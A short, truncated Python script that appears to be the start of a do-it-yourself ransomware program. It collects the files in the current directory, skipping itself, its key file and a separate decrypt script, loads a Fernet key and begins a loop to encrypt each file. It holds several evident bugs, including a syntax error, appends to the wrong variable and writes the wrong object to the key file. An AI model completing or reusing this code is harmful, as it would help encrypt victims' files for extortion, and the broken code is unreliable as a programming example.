#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files


files = []

for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                file.append(file)

print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

with open(:"thekey.key", "wb") as thekey:
        thekey.write(key)

for files in files:
           with open(file, "rb") as thefile:
